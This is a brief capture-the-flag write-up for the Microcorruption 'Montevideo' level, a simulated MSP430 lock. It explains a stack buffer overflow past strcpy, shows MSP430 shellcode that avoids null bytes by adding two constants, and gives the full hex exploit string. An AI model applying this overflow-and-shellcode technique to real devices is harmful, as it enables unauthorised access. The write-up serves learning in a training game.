# Microcorruption Montevideo Write-up

This looks pretty much like Whitehorse, and it is still allowing excess input. The only difference is this version uses *STRCPY* to copy the input from the location in memory where it is originally read to back to our stack. Unfortunately, this means it doesn't copy past a null byte, as that is the string terminating character. Our old shell code contained 7f00 which we needed to push to the stack. In this case, we get around it by adding two values that do not have any null bytes to get to 007f.

```
mov #0xfe8e, r12
add #0x01f1, r12
push r12
call #0x454c
jmp #0x4656
```

Final shell code is **FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0244FFFF3c408efe3c50f1010c12b0124c45ff3f**.
